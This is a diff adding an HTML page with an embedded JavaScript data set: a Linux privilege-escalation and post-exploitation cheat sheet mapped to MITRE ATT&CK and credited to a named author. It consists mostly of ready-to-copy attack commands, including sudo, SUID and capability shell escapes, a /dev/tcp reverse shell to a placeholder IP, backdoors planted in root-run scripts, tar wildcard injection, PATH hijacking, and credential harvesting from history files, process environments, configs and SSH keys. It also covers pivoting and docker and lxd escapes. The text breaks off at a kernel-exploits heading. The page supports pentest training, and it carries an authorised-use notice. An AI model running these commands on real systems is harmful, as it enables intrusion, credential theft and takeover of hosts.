@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>ShreeJi Structured PrivEsc - From Shell to Root</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fafaf7;color:#1a1a1a;padding:1.5rem;max-width:1400px;margin:0 auto}
+
+.header{border-bottom:2px solid #1a1a1a;padding-bottom:14px;margin-bottom:18px}
+h1{font-size:24px;font-weight:700;letter-spacing:-0.01em;margin-bottom:6px}
+.tagline{font-size:13px;color:#555;margin-bottom:10px;font-weight:500}
+.author{font-size:12px;color:#888;display:flex;align-items:center;gap:8px}
+.author b{color:#1a1a1a;font-weight:600}
+.author-dot{width:4px;height:4px;border-radius:50%;background:#888;display:inline-block}
+
+.sub{font-size:13px;color:#555;margin-bottom:1rem;line-height:1.5}
+
+.legal{background:#fff8f0;border:1px solid #f0c87a;border-radius:8px;padding:10px 14px;margin-bottom:1rem;font-size:12px;color:#6b4a00;line-height:1.5}
+.legal b{color:#3a2600}
+
+.tagline-note{background:#f1efe8;border-radius:8px;padding:10px 14px;margin-bottom:1.2rem;font-size:12px;color:#444;line-height:1.6}
+.tagline-note b{color:#1a1a1a}
+
+.search-wrap{position:relative;margin-bottom:1rem}
+input{width:100%;padding:11px 14px;font-size:14px;border:1px solid #d3d1c7;border-radius:8px;outline:none;transition:border-color .15s}
+input:focus{border-color:#666}
+
+.suggestions{position:absolute;top:100%;left:0;right:0;background:#fff;border:1px solid #d3d1c7;border-top:none;border-radius:0 0 8px 8px;z-index:10;max-height:180px;overflow:auto;display:none;box-shadow:0 4px 12px rgba(0,0,0,.08)}
+.suggestion{padding:8px 14px;font-size:13px;cursor:pointer;color:#444;border-bottom:1px solid #f1efe8}
+.suggestion:last-child{border-bottom:none}
+.suggestion:hover{background:#f9f8f5;color:#1a1a1a}
+.suggestion .sug-tag{float:right;font-size:10px;color:#888;background:#f1efe8;padding:1px 6px;border-radius:4px;margin-top:1px}
+
+.stats{display:flex;gap:16px;font-size:11px;color:#888;margin-bottom:1.4rem;flex-wrap:wrap}
+.stat-pill{background:#f1efe8;padding:4px 10px;border-radius:12px}
+
+.sec{margin-bottom:1.8rem}
+.sec-hd{display:flex;align-items:center;gap:10px;padding-bottom:8px;margin-bottom:10px;border-bottom:1px solid #e6e4db}
+.sec-icon{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
+.sec-ttl{font-size:15px;font-weight:600;color:#1a1a1a}
+.sec-cnt{font-size:11px;color:#999;margin-left:auto;background:#f1efe8;padding:2px 9px;border-radius:10px}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:8px}
+
+.card{background:#fff;border:1px solid #e6e4db;border-radius:10px;cursor:pointer;transition:border-color .15s,box-shadow .15s;overflow:hidden}
+.card:hover{border-color:#b4b2a9}
+.card.open{border-color:#666;box-shadow:0 2px 8px rgba(0,0,0,.05)}
+.card-pri{border-left:3px solid #e24b4a}
+.card-pri.open{border-left-color:#c93a39}
+
+.ch{display:flex;align-items:flex-start;gap:8px;padding:11px 13px}
+.cn{font-size:13px;font-weight:600;color:#1a1a1a;flex:1;line-height:1.4}
+.mitre{font-size:10px;background:#eef3ff;color:#2a4d9b;padding:3px 7px;border-radius:5px;white-space:nowrap;font-weight:500;margin-top:1px}
+.arr{font-size:10px;color:#bbb;transition:transform .2s;margin-top:3px;flex-shrink:0}
+.card.open .arr{transform:rotate(180deg)}
+
+.desc{font-size:12px;color:#666;padding:0 13px 10px;line-height:1.5}
+
+.body{display:none;border-top:1px solid #f1efe8;padding:12px 13px;background:#fdfdfc}
+.card.open .body{display:block}
+
+.eb{background:#111;border-radius:7px;padding:10px 12px;margin-bottom:7px}
+.eb:last-child{margin-bottom:0}
+.eb-top{display:flex;align-items:flex-start;justify-content:space-between;gap:8px;margin-bottom:4px}
+.ec{font-family:'SF Mono',Consolas,monospace;font-size:12px;color:#e8e8e8;white-space:pre-wrap;line-height:1.7;flex:1;word-break:break-word}
+.prompt{color:#7ed957;user-select:none}
+.copy-btn{font-size:10px;padding:3px 9px;border:1px solid #333;border-radius:5px;color:#888;cursor:pointer;background:transparent;white-space:nowrap;flex-shrink:0;font-family:inherit;transition:all .15s}
+.copy-btn:hover{border-color:#7ed957;color:#7ed957}
+.copy-btn.copied{border-color:#7ed957;color:#7ed957;background:rgba(126,217,87,.1)}
+.eo{font-family:'SF Mono',Consolas,monospace;font-size:11px;color:#9a9a9a;white-space:pre-wrap;line-height:1.5;margin-top:8px;padding-top:8px;border-top:1px solid #2a2a2a}
+.en{font-size:11px;color:#555;border-top:1px solid #e6e4db;margin-top:7px;padding-top:7px;line-height:1.5}
+
+.hit{background:#fff6e5;border:1px solid #f5a623;border-radius:7px;padding:9px 12px;margin-top:10px;font-size:11px;color:#5a3a00;line-height:1.6}
+.hit b{color:#3a2000;font-size:11px;text-transform:uppercase;letter-spacing:0.03em}
+.hit pre{font-family:'SF Mono',Consolas,monospace;font-size:11px;margin-top:6px;white-space:pre-wrap;color:#4a2e00;line-height:1.6}
+
+.warn{background:#fff3f3;border:1px solid #f2c6c6;border-radius:7px;padding:9px 12px;margin-top:8px;font-size:11px;color:#5a1a1a;line-height:1.6}
+.warn b{color:#3a0000;text-transform:uppercase;letter-spacing:0.03em}
+
+.nr{text-align:center;padding:2.5rem;color:#999;font-size:14px;background:#fff;border-radius:10px;border:1px dashed #d3d1c7}
+
+.footer{margin-top:2rem;padding-top:1rem;border-top:1px solid #e6e4db;font-size:11px;color:#999;text-align:center}
+</style>
+</head>
+<body>
+
+<div class="header">
+<h1>ShreeJi Structured PrivEsc - From Shell to Root</h1>
+<div class="tagline">Linux Pentest Mapped with MITRE ATT&amp;CK</div>
+<div class="author"><b>Dr. Saket Acharya</b><span class="author-dot"></span><span>Post-exploitation reference guide</span></div>
+</div>
+
+<div class="legal"><b>⚠ Authorised use only.</b> For CTFs, labs, your own machines, or engagements with written permission. Running these techniques on systems you do not own is illegal.</div>
+
+<p class="sub">Ordered by impact - run in sequence, stop when you get root. Each technique is mapped to a MITRE ATT&amp;CK technique ID.</p>
+
+<div class="search-wrap">
+<input id="search" placeholder="Search commands, techniques, MITRE IDs (try: sudo, T1548, credentials, container...)"/>
+<div id="suggestions" class="suggestions"></div>
+</div>
+
+<div class="stats" id="stats"></div>
+
+<div id="out"></div>
+
+<div class="footer">Built for structured, methodical post-exploitation - Dr. Saket Acharya</div>
+
+<script>
+const cmdStore = [];
+
+function copyCmd(btn, idx) {
+  const txt = cmdStore[idx] || '';
+  const done = () => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+  };
+  const fallback = () => {
+    const ta = document.createElement('textarea');
+    ta.value = txt;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+    done();
+  };
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(txt).then(done).catch(fallback);
+  } else { fallback(); }
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+const data = [
+  {
+    sec: "💣 Privilege Escalation - Instant Wins",
+    icon: "💣",
+    color: "background:#FCEBEB;color:#A32D2D",
+    items: [
+      {
+        t: "sudo -l - always run first",
+        m: "T1548.003",
+        mName: "Sudo/Caching",
+        desc: "If NOPASSWD exists anywhere - stop and exploit immediately. Single highest-value command.",
+        priority: true,
+        cmds: [
+          { c: "sudo -l", o: "(ALL) NOPASSWD: /usr/bin/vim\n(root) NOPASSWD: /opt/backup.sh", t: "Any NOPASSWD entry = instant privesc via GTFOBins" },
+          { c: "sudo -ll", t: "Verbose form - shows Defaults, env settings, full rule breakdown" },
+          { c: "cat /etc/sudoers 2>/dev/null; cat /etc/sudoers.d/* 2>/dev/null", t: "Drop-in rules often more permissive than main sudoers" }
+        ],
+        hit: "vim NOPASSWD:    sudo vim -c ':!/bin/bash'\nless NOPASSWD:   sudo less /etc/passwd   then   !sh\npython NOPASSWD: sudo python3 -c 'import os; os.system(\"/bin/bash\")'\nfind NOPASSWD:   sudo find . -exec /bin/bash \\;",
+        warn: "Password-required sudo is NOT exploitable this way. Check GTFOBins for every allowed binary."
+      },
+      {
+        t: "SUID - only the dangerous binaries",
+        m: "T1548.001",
+        mName: "Setuid/Setgid",
+        desc: "Filter SUID to known-exploitable binaries. Skip system noise like passwd, sudo, mount.",
+        priority: true,
+        cmds: [
+          { c: "find / -perm -4000 -type f 2>/dev/null | grep -iE '/(find|vim|nano|less|more|awk|perl|python|ruby|bash|sh|tar|nmap|cp|mv|cat|env)$'", o: "/usr/bin/find\n/usr/bin/python3", t: "Anything that prints = GTFOBins target, immediate exploit path" },
+          { c: "find / -perm -4000 -type f 2>/dev/null", t: "Full list - check every non-standard binary on GTFOBins" },
+          { c: "find / -perm -6000 -type f 2>/dev/null", t: "SUID + SGID bits - even more dangerous when combined" }
+        ],
+        hit: "find SUID:   find . -exec /bin/bash -p \\; -quit\nbash SUID:   /bin/bash -p\npython SUID: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\ntar SUID:    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\nnmap SUID:   nmap --interactive  then  !sh"
+      },
+      {
+        t: "Capabilities - dangerous ones",
+        m: "T1548",
+        mName: "Abuse Elevation Control",
+        desc: "cap_setuid or cap_setgid on any interpreter = instant root. Modern replacement for SUID.",
+        priority: true,
+        cmds: [
+          { c: "getcap -r / 2>/dev/null | grep -iE 'cap_setuid|cap_setgid'", o: "/usr/bin/python3.9 = cap_setuid+ep\n/usr/bin/perl = cap_setuid+ep", t: "ep = effective + permitted = unrestricted capability" },
+          { c: "getcap -r / 2>/dev/null | grep -iE 'cap_dac|cap_sys_admin|cap_sys_ptrace'", t: "dac_read_search = read any file. sys_admin = near-root. sys_ptrace = inject into processes" },
+          { c: "getcap -r / 2>/dev/null", t: "Full list - useful if you suspect custom/unusual capability assignments" }
+        ],
+        hit: "python cap_setuid:\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nperl cap_setuid:\nperl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\"'\nruby cap_setuid:\nruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
+      },
+      {
+        t: "Root-owned, world-writable files",
+        m: "T1222",
+        mName: "File Permissions Modification",
+        desc: "Files owned by root you can modify. If executed anywhere as root = privesc.",
+        priority: true,
+        cmds: [
+          { c: "find / -type f -user root -perm -o=w 2>/dev/null | grep -v -E '/proc|/sys|/dev'", o: "/etc/crontab\n/opt/backup.sh", t: "Excludes pseudo-filesystems. Focus on /etc, /opt, /usr/local" },
+          { c: "find / -type f -user root -perm -o=w 2>/dev/null | grep -E '\\.(sh|py|pl|conf|env|yml)$'", t: "Filter to scripts and configs - highest exploitation chance" }
+        ],
+        hit: "1. Find out what executes this file (cron/service/interactive)\n2. Append payload:\n   echo 'chmod +s /bin/bash' >> /opt/backup.sh\n3. Wait for execution\n4. /bin/bash -p"
+      },
+      {
+        t: "Root process from writable location",
+        m: "T1574",
+        mName: "Hijack Execution Flow",
+        desc: "Root running a binary from /tmp, /dev/shm, or /var/tmp = trivial replacement.",
+        priority: true,
+        cmds: [
+          { c: "ps -eo user,cmd --no-headers | grep -E '^root.*(/tmp|/dev/shm|/var/tmp)'", o: "root  /tmp/update.sh\nroot  /dev/shm/runner.py", t: "Replace file with payload - runs as root on next execution" },
+          { c: "ls -la /tmp /dev/shm /var/tmp 2>/dev/null", t: "Inspect writable directories for recently modified files" }
+        ],
+        hit: "echo '#!/bin/bash' > /tmp/update.sh\necho 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /tmp/update.sh\nchmod +x /tmp/update.sh\n# or: echo 'chmod +s /bin/bash' > /tmp/update.sh"
+      }
+    ]
+  },
+  {
+    sec: "🎯 Execution Path Enumeration",
+    icon: "🎯",
+    color: "background:#FAEEDA;color:#854F0B",
+    items: [
+      {
+        t: "Mega one-liner - full execution map",
+        m: "T1057 + T1053 + T1007",
+        mName: "Combined Discovery",
+        desc: "Root processes + cron + systemd services - all paths in one shot with writability check.",
+        cmds: [
+          { c: "(ps -eo user,cmd --no-headers | awk '$1==\"root\"' | grep -oE '/[^ ]+\\.(sh|py|pl)'; cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#' | grep -oE '/[^ ]+'; systemctl list-units --type=service --state=running --no-pager | awk '{print $1}' | xargs -I{} systemctl show {} --property=ExecStart --no-pager | grep -oE '/[^ ;]+') | sort -u | xargs -I{} ls -la {} 2>/dev/null", o: "-rwxrwxr-- 1 root root  /opt/backup.sh  <- writable!\n-rwxr-xr-x 1 root root  /usr/sbin/nginx", t: "Focus on lines with w in group (cols 5-7) or other (cols 8-10)" }
+        ],
+        hit: "If the output shows any writable path owned by root → that's your exploit.\nIf writable: append reverse shell or SUID trigger to the script."
+      },
+      {
+        t: "Filter root processes - scripts only",
+        m: "T1057",
+        mName: "Process Discovery",
+        desc: "Strip kernel threads and noise. Show only scripts/interpreters running as root.",
+        cmds: [
+          { c: "ps -eo user,pid,cmd --no-headers | awk '$1==\"root\"' | grep -E '\\.sh|\\.py|\\.pl|cron|backup|sleep|tar|rsync'", o: "root  1234 /opt/backup.sh\nroot  1456 sleep 300\nroot  1890 /usr/bin/python3 /opt/script.py", t: "sleep 300 = cyclic execution = reliable window" },
+          { c: "ps -eo user,cmd --no-headers | awk '$1==\"root\"' | grep -oE '/[^ ]+\\.(sh|py|pl)' | sort -u", t: "Clean list of just the script paths" },
+          { c: "ps -ef --forest 2>/dev/null", t: "Parent-child tree - reveals launcher relationships and service managers" }
+        ],
+        hit: "For each path found:\nls -la PATH        # check permissions\ncat PATH           # read contents\nstrings PATH       # find hijackable commands"
+      },
+      {
+        t: "Cron - extract executed paths only",
+        m: "T1053.003",
+        mName: "Scheduled Task - Cron",
+        desc: "Skip timing noise, extract just what gets run.",
+        cmds: [
+          { c: "cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#' | grep -oE '/[^ ]+'", o: "/home/user/script.sh\n/opt/backup.sh", t: "-oE extracts just the executable path" },
+          { c: "ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null", t: "Scripts here auto-execute as root. Check if any are writable by you" },
+          { c: "ls -la /var/spool/cron/crontabs/ 2>/dev/null", t: "Per-user crontabs - sometimes reveals other users' schedules" }
+        ],
+        hit: "If cron script is writable: append payload, wait for cron interval\nIf cron calls commands without full path: PATH hijack opportunity\nIf cron sources a writable .env or config: modify that indirectly"
+      },
+      {
+        t: "Systemd - ExecStart with writability",
+        m: "T1543.002",
+        mName: "Systemd Service",
+        desc: "What binaries do running services invoke? Are unit files writable?",
+        cmds: [
+          { c: "systemctl list-units --type=service --state=running --no-pager | awk '{print $1}' | xargs -I{} systemctl show {} --property=ExecStart --no-pager | grep -oE '/[^ ;]+' | sort -u | xargs -I{} ls -la {} 2>/dev/null", t: "Every binary a running service invokes with permissions attached" },
+          { c: "find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null", t: "Writable unit files - edit ExecStart, daemon-reload, restart = root" },
+          { c: "systemctl list-timers --all 2>/dev/null", t: "Systemd timers - cron equivalent that's often overlooked in audits" }
+        ],
+        hit: "Writable unit file exploit:\nsed -i 's|ExecStart=.*|ExecStart=/bin/bash -c \"chmod +s /bin/bash\"|' /etc/systemd/system/SERVICE\nsystemctl daemon-reload\nsystemctl restart SERVICE\n/bin/bash -p"
+      }
+    ]
+  },
+  {
+    sec: "🔀 Execution Hijack",
+    icon: "🔀",
+    color: "background:#EEEDFE;color:#534AB7",
+    items: [
+      {
+        t: "Writable PATH directories",
+        m: "T1574.007",
+        mName: "PATH Interception",
+        desc: "Drop a fake binary into a directory root searches before /usr/bin.",
+        cmds: [
+          { c: "echo $PATH | tr ':' '\\n' | xargs -I{} sh -c 'ls -ld {} 2>/dev/null' | grep '^d........w'", o: "drwxrwxr-x 2 root saket /home/saket/.local/bin", t: "Writable dir before /usr/bin = hijackable if script inherits your PATH" },
+          { c: "for d in $(echo $PATH | tr ':' ' '); do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done", t: "Cleaner loop - only prints writable PATH entries" },
+          { c: "echo $PATH", t: "Review order - earlier directories take priority" }
+        ],
+        hit: "1. strings /opt/backup.sh | grep -v '/'     # find bare commands\n2. echo '#!/bin/bash' > ~/.local/bin/CMD\n   echo 'chmod +s /bin/bash' >> ~/.local/bin/CMD\n   chmod +x ~/.local/bin/CMD\n3. Wait for root to run the script\n4. /bin/bash -p",
+        warn: "PATH must be inherited by the root process. Cron and systemd often reset PATH via sanitize_path - test on your own binary first."
+      },
+      {
+        t: "Commands called without full path",
+        m: "T1574.007",
+        mName: "PATH Interception",
+        desc: "Scripts calling service instead of /usr/bin/service = hijackable.",
+        cmds: [
+          { c: "cat /opt/backup.sh | grep -vE '^\\s*#' | grep -oE '\\b[a-z_][a-z0-9_-]{2,}\\b' | sort -u", t: "Extract bare tokens from a script - filter against system binaries" },
+          { c: "strings /opt/backup.sh 2>/dev/null | grep -vE '^/' | grep -E '^[a-z]{3,}$'", t: "For compiled binaries - find embedded command names" }
+        ],
+        hit: "Common hijackable commands: curl, wget, python, tar, cp, systemctl, service\nIf script calls 'curl' (not '/usr/bin/curl'):\necho '#!/bin/bash' > ~/.local/bin/curl\necho 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> ~/.local/bin/curl\nchmod +x ~/.local/bin/curl"
+      },
+      {
+        t: "High-value custom directories",
+        m: "T1083",
+        mName: "File & Directory Discovery",
+        desc: "/opt and /usr/local are where admins drop custom code - often misconfigured.",
+        cmds: [
+          { c: "ls -la /opt /usr/local/bin /usr/local/sbin /srv 2>/dev/null", t: "Custom binaries rarely hardened as well as system packages" },
+          { c: "find /opt /usr/local -type f -writable 2>/dev/null", t: "Writable files in custom dirs - high privesc potential" },
+          { c: "find /opt /usr/local \\( -name '*.sh' -o -name '*.py' -o -name '*.conf' \\) 2>/dev/null | xargs ls -la 2>/dev/null", t: "All scripts and configs in custom dirs with permissions" }
+        ],
+        hit: "Audit each file in /opt for:\n• Writable by you\n• Called by root cron/service/login script\n• Contains hardcoded credentials\n• Sources another writable file (chain exploit)"
+      },
+      {
+        t: "Wildcard injection in root scripts",
+        m: "T1574",
+        mName: "Hijack Execution Flow",
+        desc: "Root scripts using tar/chown/chmod with wildcards = argument injection.",
+        cmds: [
+          { c: "grep -rE 'tar.*\\*|chown.*\\*|chmod.*\\*|rsync.*\\*' /opt /etc/cron* 2>/dev/null", o: "tar -czf backup.tar.gz /var/www/html/*", t: "Wildcard path you can write to = you can inject tar's own flags as filenames" },
+          { c: "grep -rE '\\$[A-Z_]+/\\*' /opt 2>/dev/null", t: "Find wildcards in variable-based paths too" }
+        ],
+        hit: "tar wildcard exploit (classic):\ncd /var/www/html\necho '#!/bin/bash' > shell.sh\necho 'chmod +s /bin/bash' >> shell.sh\nchmod +x shell.sh\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh shell.sh'\n# When root runs: tar czf X *\n# tar sees --checkpoint flags as arguments",
+        warn: "Only works with GNU tar and when shell glob-expands the wildcard (not with find -exec). Verify with: tar --version"
+      }
+    ]
+  },
+  {
+    sec: "🔑 Credential Access",
+    icon: "🔑",
+    color: "background:#FBEAF0;color:#993556",
+    items: [
+      {
+        t: "Bash history across all users",
+        m: "T1552.003",
+        mName: "Bash History",
+        desc: "CLI commands logged forever - frequently contains plaintext credentials.",
+        cmds: [
+          { c: "cat ~/.bash_history 2>/dev/null | grep -iE 'pass|secret|key|token|mysql|ssh|curl.*-[uU]'", o: "mysql -u root -pS3cr3tPass!\ncurl -H 'Authorization: Bearer abc123'", t: "Filter for credential-related patterns" },
+          { c: "find /home /root -name '.*history' -readable 2>/dev/null | xargs grep -iE 'pass|secret|key|token' 2>/dev/null", t: "Search every readable history file: bash, zsh, mysql, python" },
+          { c: "cat ~/.bash_history 2>/dev/null | tail -100", t: "Recent command history - admin's latest actions" }
+        ],
+        hit: "Found DB creds? Try:       mysql -u USER -p\nFound SSH key path? Use it:  ssh -i /path/to/key user@host\nFound API token? Test on:    local/internal services"
+      },
+      {
+        t: "Environment variables of root processes",
+        m: "T1552.001",
+        mName: "Credentials in Files",
+        desc: "/proc/PID/environ leaks secrets injected at process start - common in containers.",
+        cmds: [
+          { c: "for pid in $(ps -eo pid,user --no-headers | awk '$2==\"root\"{print $1}'); do cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|key|token|aws|db_'; done", t: "Dumps env vars of every root process, greps for creds" },
+          { c: "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|aws|api'", t: "PID 1 often inherits deployment-time secrets" },
+          { c: "strings /proc/*/environ 2>/dev/null | grep -iE 'password|api_key|token|secret' | sort -u", t: "Cross-process grep - covers every process you can read" }
+        ],
+        hit: "AWS/Cloud keys found:\nexport AWS_ACCESS_KEY_ID=...\naws s3 ls\n\nDB password: connect directly to internal DB port\nAPI token: try on internal admin panels"
+      },
+      {
+        t: "Web app and framework configs",
+        m: "T1552.001",
+        mName: "Credentials in Files",
+        desc: "Every framework stores DB credentials in plaintext files - find them.",
+        cmds: [
+          { c: "find / -name 'wp-config.php' -readable 2>/dev/null | xargs grep -iE 'DB_PASSWORD|DB_USER' 2>/dev/null", t: "WordPress configs - DB credentials in plaintext" },
+          { c: "find / -name '.env' -readable 2>/dev/null | xargs grep -iE 'pass|secret|key|db_' 2>/dev/null", t: "Laravel/Node/Django .env - all secrets centralised" },
+          { c: "find / \\( -name 'database.yml' -o -name 'settings.py' -o -name 'config.php' \\) -readable 2>/dev/null | xargs ls -la 2>/dev/null", t: "Rails, Django, PHP framework configs" },
+          { c: "find / -name '*.htpasswd' -readable 2>/dev/null", t: "HTTP Basic Auth hashes - crack offline with john/hashcat" }
+        ],
+        hit: "DB creds from web config → direct DB access:\nmysql -u webuser -p'WebP@ss' webdb\nSELECT user,authentication_string FROM mysql.user;\n\nDump hashes, crack offline with hashcat -m 1800 (SHA-512 crypt)"
+      },
+      {
+        t: "SSH keys and authorized_keys",
+        m: "T1552.004",
+        mName: "Private Keys",
+        desc: "Private keys = lateral movement. known_hosts = your pivot target map.",
+        cmds: [
+          { c: "find / \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' \\) -readable 2>/dev/null", t: "Readable private keys - often permission-misconfigured" },
+          { c: "find / -name 'authorized_keys' -readable 2>/dev/null | xargs ls -la 2>/dev/null", t: "Which keys can log into which accounts across the system" },
+          { c: "cat ~/.ssh/known_hosts 2>/dev/null", o: "192.168.1.10 ssh-rsa AAAA...\n192.168.1.20 ssh-ed25519 AAAA...", t: "Every host you've SSH'd into = pivot target list" },
+          { c: "ls -la ~/.ssh/ 2>/dev/null", t: "Inspect the full ssh directory - keys, configs, authorized hosts" }
+        ],
+        hit: "If id_rsa readable:\nchmod 600 /path/to/id_rsa\nssh -i /path/to/id_rsa user@TARGET\n\nTry your key against every IP in known_hosts"
+      },
+      {
+        t: "Recent root-modified files",
+        m: "T1083",
+        mName: "File & Directory Discovery",
+        desc: "Files root touched recently - reveals admin activity and open windows.",
+        cmds: [
+          { c: "find / -user root -mtime -1 -type f 2>/dev/null | grep -v -E '/proc|/sys|/var/log|/run' | head -20", t: "Root-owned files modified in the last 24 hours" },
+          { c: "find / -user root -mmin -60 -type f 2>/dev/null | head -10", t: "Last 60 minutes - catches active admin sessions" }
+        ],
+        hit: "Recently modified files reveal:\n• Active deployment scripts\n• Running cron windows\n• Recent admin uploads (may contain creds)"
+      }
+    ]
+  },
+  {
+    sec: "🔁 Lateral Movement",
+    icon: "🔁",
+    color: "background:#E6F1FB;color:#185FA5",
+    items: [
+      {
+        t: "Active connections - map the network",
+        m: "T1049",
+        mName: "Network Connections",
+        desc: "Who's talking to this box? Where is it reaching out? Build the pivot map.",
+        cmds: [
+          { c: "ss -tulnp 2>/dev/null", o: "LISTEN 0.0.0.0:22  users:((\"sshd\",pid=982))", t: "Modern replacement for netstat - cleaner, process-aware" },
+          { c: "netstat -tulnp 2>/dev/null", t: "Fallback if ss isn't available on minimal systems" },
+          { c: "ss -tn state established 2>/dev/null", o: "192.168.1.13:22  192.168.1.6:58514\n192.168.1.13:1883  192.168.1.251:54697", t: "Active connections only - shows who's talking to you now" },
+          { c: "ss -tln | grep '127.0.0.1'", t: "Internal-only services - ripe for SSH port forwarding" }
+        ],
+        hit: "Services on 127.0.0.1 (MySQL 3306, Redis 6379, PHP-FPM 9000) are hidden externally but reachable from here.\nSSH tunnel from attacker: ssh -L 3306:127.0.0.1:3306 user@TARGET"
+      },
+      {
+        t: "ARP cache - local neighbors",
+        m: "T1016",
+        mName: "System Network Config Discovery",
+        desc: "Every device you've recently talked to - faster than subnet scan, less noisy.",
+        cmds: [
+          { c: "ip neigh 2>/dev/null", o: "192.168.1.1 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE", t: "Modern replacement for arp -a" },
+          { c: "arp -a 2>/dev/null", t: "Classic arp fallback" }
+        ],
+        hit: "MAC vendor prefix reveals device type - useful for identifying routers, printers, IoT devices"
+      },
+      {
+        t: "Routing table + DNS servers",
+        m: "T1016",
+        mName: "System Network Config Discovery",
+        desc: "Find internal network segments and infrastructure.",
+        cmds: [
+          { c: "ip route 2>/dev/null", o: "default via 192.168.1.1\n10.0.0.0/24 via 192.168.1.254", t: "Additional routes = internal network segments to pivot into" },
+          { c: "cat /etc/resolv.conf", o: "nameserver 192.168.1.10", t: "DNS server often = domain controller in AD environments" },
+          { c: "cat /etc/hosts", t: "Static DNS entries reveal critical internal infrastructure names" }
+        ],
+        hit: "Hostnames like dc01, db-prod, backup-srv = high-value targets.\nMuch more useful than blind subnet scanning."
+      },
+      {
+        t: "Subnet sweep without tools",
+        m: "T1018",
+        mName: "Remote System Discovery",
+        desc: "Find live hosts on stripped-down systems using only bash built-ins.",
+        cmds: [
+          { c: "for i in $(seq 1 254); do (ping -c 1 -W 1 192.168.1.$i 2>/dev/null | grep 'bytes from' &); done 2>/dev/null | awk '{print $4}'", t: "Parallel ping sweep - no external tools required" },
+          { c: "for port in 22 80 443 3306 5432 6379 8080 9000; do (timeout 1 bash -c \"cat < /dev/tcp/TARGET_IP/$port\" 2>/dev/null && echo \"$port open\" &); done", t: "Bash /dev/tcp port probe - works without nc, nmap, or curl" }
+        ],
+        hit: "/dev/tcp is a bash built-in. Essential for minimal environments where only bash is available."
+      }
+    ]
+  },
+  {
+    sec: "🐳 Container / AD Context",
+    icon: "🐳",
+    color: "background:#E1F5EE;color:#0F6E56",
+    items: [
+      {
+        t: "Container detection",
+        m: "T1613",
+        mName: "Container Discovery",
+        desc: "Are you in a container? Escape path differs from bare-metal LPE.",
+        cmds: [
+          { c: "cat /proc/1/cgroup 2>/dev/null | head -5", o: "12:pids:/docker/abc123\n11:memory:/docker/abc123", t: "docker/lxc/kubepods in output = you're in a container" },
+          { c: "ls -la /.dockerenv 2>/dev/null && echo 'IN DOCKER'", t: "This file only exists inside Docker containers" },
+          { c: "cat /proc/self/status | grep CapEff", o: "CapEff: 000001ffffffffff", t: "All fs = privileged container = easy host escape" },
+          { c: "mount | grep -E 'docker|overlay'", t: "Overlay filesystem = Docker. Check for host path mounts" }
+        ],
+        hit: "Privileged container escape (CapEff full):\nmount /dev/sda1 /mnt 2>/dev/null || fdisk -l\nchroot /mnt /bin/bash\n# You now have root on the HOST"
+      },
+      {
+        t: "Docker socket = host root",
+        m: "T1611",
+        mName: "Escape to Host",
+        desc: "/var/run/docker.sock accessible = full host root. Period.",
+        cmds: [
+          { c: "ls -la /var/run/docker.sock 2>/dev/null", o: "srw-rw---- 1 root docker /var/run/docker.sock", t: "Access via docker group membership or world-writable" },
+          { c: "find / -name 'docker.sock' 2>/dev/null", t: "Sometimes mounted at non-standard paths in containers" },
+          { c: "groups | grep -E 'docker|lxd'", t: "Membership in docker/lxd group = equivalent to root" }
+        ],
+        hit: "Docker socket escape:\ndocker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh\n# Root on the HOST, not just container\n\nlxd group:\nlxc init ubuntu:18.04 test -c security.privileged=true\nlxc config device add test host-root disk source=/ path=/mnt/host\nlxc start test && lxc exec test /bin/bash"
+      },
+      {
+        t: "Active Directory context",
+        m: "T1069.002",
+        mName: "Domain Groups Discovery",
+        desc: "On a domain-joined Linux box - enumerate AD targets for pivoting.",
+        cmds: [
+          { c: "cat /etc/resolv.conf | grep nameserver", o: "nameserver 192.168.1.10", t: "DNS server is almost always the domain controller" },
+          { c: "cat /etc/krb5.conf 2>/dev/null", t: "Kerberos config - reveals domain name and KDC location" },
+          { c: "realm list 2>/dev/null", t: "Shows AD domain this machine is joined to" },
+          { c: "getent passwd 2>/dev/null | awk -F: '$3>=1000' | head -20", t: "Domain users pulled via SSSD/winbind - find admin accounts" }
+        ],
+        hit: "With valid AD creds from this box:\ncrackmapexec smb 192.168.1.0/24 -u USER -p PASS\nHunt: Kerberoastable accounts, AdminCount=1 users, writable GPOs"
+      }
+    ]
+  },
+  {
+    sec: "💥 Kernel Exploits",
+    icon: "💥",
